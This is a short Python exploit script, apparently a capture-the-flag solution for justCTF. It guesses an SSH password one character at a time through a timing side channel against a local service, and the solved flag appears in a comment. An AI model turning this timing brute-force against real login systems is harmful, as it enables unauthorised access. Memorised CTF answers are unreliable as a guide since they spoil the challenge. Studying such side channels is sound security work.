#!/usr/bin/env python3

from pwn import *
from datetime import datetime

def to_seconds(t):
    time_obj = datetime.strptime(t, "%H:%M:%S.%f")
    total_seconds = time_obj.hour * 3600 + time_obj.minute * 60 + time_obj.second + time_obj.microsecond / 1e6
    return total_seconds

characters =  "_cdhjlnstuw}" + string.digits + "CFT{"
flag = "" # justCTF{s1d3ch4nn3ls_4tw_79828}

while True:
    p = process(["ssh", "-l", "ctf", "-p", "1337", "localhost"], stdin=PTY, stdout=PTY, stderr=PTY)
    highest_time = 0
    best_char = "\x69"
    for char in characters:
        new_flag = flag + char
        p.readuntil(b"password: ")
        p.sendline(new_flag.encode())
        p.readline().decode()
        start = to_seconds(p.readline()[13:].decode().split("]")[0])
        stop = to_seconds(p.readline()[13:].decode().split("]")[0])
        diff = stop - start
        if diff > highest_time:
            highest_time = diff
            best_char = char
    flag += best_char
    log.info(flag)
